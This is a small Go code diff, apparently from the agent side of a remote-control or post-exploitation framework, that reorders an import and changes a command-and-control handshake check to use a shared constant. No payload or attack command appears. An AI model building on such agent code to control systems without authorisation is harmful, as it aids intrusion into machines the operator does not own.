@@ -5,7 +5,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net"
 	"net/http"
 	"net/url"
@@ -14,6 +13,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -123,7 +124,7 @@ func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel contex
 				break
 			}
 			resp := msg.Response
-			if strings.HasPrefix(resp, "hello") {
+			if strings.HasPrefix(resp, def.TransportString) {
 				logging.Printf("Hello (%s) received", resp)
 				// mark the hello as success
 				for hello := range HandShakes {
